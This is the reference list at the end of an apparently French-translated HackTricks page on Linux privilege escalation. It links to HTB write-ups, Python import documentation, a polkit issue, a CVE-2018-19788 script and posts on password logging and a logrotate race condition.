- [30] [0xdf – HTB : Browsed](https://0xdf.gitlab.io/2026/03/28/htb-browsed.html)
- [31] [PEP 3147 – Répertoires de dépôt PYC](https://peps.python.org/pep-3147/)
- [32] [Documentation Python importlib](https://docs.python.org/3/library/importlib.html)
- [33] [polkit/polkit issue #74](https://gitlab.freedesktop.org/polkit/polkit/issues/74)
- [34] [mirchr/security-research](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh)
- [35] [Tweet de @paragonsec](https://twitter.com/paragonsec/status/1071152249529884674)
- [36] [redsiege.com - Journalisation des mots de passe sous Linux](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux)
- [37] [tech.feedyourhead.at - Détails d’une condition de concurrence dans logrotate](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)
- [38] [Documentation Python 3.10 – `site` et fichiers de configuration des chemins](https://docs.python.org/3.10/library/site.html)
- [39] [0xdf – HTB : SmartHire](https://0xdf.gitlab.io/2026/09/26/htb-smarthire.html)
{{#include ../../../banners/hacktricks-training.md}}
